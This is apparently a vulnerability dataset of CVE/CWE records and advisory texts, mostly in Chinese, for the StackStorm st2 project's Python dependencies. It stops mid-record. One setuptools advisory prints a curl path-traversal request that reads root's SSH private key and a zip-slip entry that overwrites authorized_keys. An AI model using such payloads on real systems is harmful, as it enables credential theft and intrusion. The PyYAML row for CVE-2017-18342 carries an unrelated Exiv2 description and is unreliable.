StackStorm_st2,pymongo,">=4.0.0,<4.7",True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,PyYAML,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
StackStorm_st2,PyYAML,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
StackStorm_st2,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
StackStorm_st2,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
StackStorm_st2,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
StackStorm_st2,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
StackStorm_st2,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
StackStorm_st2,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
StackStorm_st2,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
StackStorm_st2,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
StackStorm_st2,ujson,,True,CVE-2022-31117,CWE-415,2022-07-04,"UltraJSON是开源的一个超快的 JSON 编码器和解码器，用纯 C 语言编写，并绑定了 Python 3.7+。
UltraJSON 5.4.0之前版本存在资源管理错误漏洞，该漏洞源于为字符串解码重新分配缓冲区时发生错误，可能导致缓冲区被释放两次。",3,0
StackStorm_st2,ujson,,True,CVE-2022-31116,CWE-670,2022-07-05,"UltraJSON是开源的一个超快的 JSON 编码器和解码器，用纯 C 语言编写，并绑定了 Python 3.7+。
UltraJSON 5.4.0之前版本存在安全漏洞，该漏洞源于无法正确解码某些字符，允许字典中潜在的键混淆和值覆盖。",2,2
StackStorm_st2,virtualenv,,True,CVE-2011-4617,CWE-59,2011-12-31,Virtualenv中存在漏洞，该漏洞源于使用不安全的方式创建临时文件。有本地访问权的攻击者可能利用该漏洞执行符号链接攻击，攻击成功可能允许攻击者损坏敏感文件或者获得对敏感信息的访问权，也可能执行其他的攻击。,3,0
StackStorm_st2,virtualenv,,True,CVE-2024-53899,CWE-77 CWE-78,2024-10-01,"Virtualenv是Python Packaging Authority开源的一款Python虚拟环境构建器。
Virtualenv 20.26.6之前版本存在操作系统命令注入漏洞，该漏洞源于Magic模板字符串未正确引用。",3,0
StackStorm_st2,webob,,True,,CWE-113,2015-10-08,"## Overview
[`webob`](https://pypi.python.org/pypi/webob) is a WSGI request and response object.

Affected versions of this package are vulnerable to HTTP Response Splitting attacks. It is possible to set arbitrary headers in the HTTP response by embedding a \\r or \\n character in the header value, and sending it to the server.

## References
- [GitHub Issue](https://github.com/Pylons/webob/issues/217)
- [GitHub PR](https://github.com/Pylons/webob/pull/229)
- [GitHub Commit](https://github.com/Pylons/webob/commit/97041f58fcee30b37a8c0fba0108cf69c6e01330)
",3,2
StackStorm_st2,webob,,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
StackStorm_st2,wheel,,True,CVE-2022-40898,CWE-20,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Packaging Authority (PyPA) Wheel 0.37.1版本及之前版本存在安全漏洞。攻击者利用该漏洞通过控制Wheel cli输入导致拒绝服务。",2,2
StackStorm_st2,redis,,True,CVE-2023-28858,CWE-193,2023-03-24,"redis-py是基于Python的redis接口库。
redis-py 4.5.3之前版本存在安全漏洞。攻击者利用该漏洞可以将响应数据发送到客户端。",3,0
StackStorm_st2,cryptography,43.0.3,True,CVE-2024-12797,CWE-392,2025-02-11,<p>OpenSSL 是一个用于实现传输层安全（TLS）和安全套接层（SSL）协议的开源软件库，广泛应用于保护互联网通信。漏洞位于文件 ssl/statem/statem_clnt.c 中的函数 tls_post_process_server_rpk，此函数用于在 TLS 握手过程中处理和验证服务器的原始公钥（RPK）。由于在 tls_post_process_server_rpk 函数调用中未充分处理 ssl_verify_rpk 的返回值，导致在 RPK 验证失败的情况下未能及时终止连接，使未经验证的服务器能够继续完成握手过程。攻击者可以利用此缺陷进行中间人攻击，从而截取或篡改通信内容。</p>,3,0
StackStorm_st2,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,setuptools,<78,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
StackStorm_st2,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
StackStorm_st2,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
StackStorm_st2,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
StackStorm_st2,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
StackStorm_st2,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
StackStorm_st2,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
StackStorm_st2,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
StackStorm_st2,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
StackStorm_st2,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
StackStorm_st2,oslo.utils,,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
StackStorm_st2,oslo.utils,,True,CVE-2014-7231,CWE-200,2014-10-08,"OpenStack是美国国家航空航天局（National Aeronautics and Space Administration）和美国Rackspace公司合作研发的一个云平台管理项目。OpenStack oslo-incubator是Oslo（提供了一系列OpenStack Projects共享基础库的项目）的一部分；Cinder为其提供块存储服务功能；Nova是其中的一个用Python编写的云计算构造控制器，属于IaaS系统的一部分；Trove是其中的一个Database as a Service项目。
多款OpenStack产品中的‘strutils.mask_password’函数中存在安全漏洞，该漏洞源于程序记录命令时没有正确隐藏密码。本地攻击者可通过读取日志获取密码。以下产品和版本受到影响：OpenStack oslo-incubator；Cinder 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Nova 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Trove 2013.2.3及之前版本，2014.1.1版本，2014.1",3,0
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

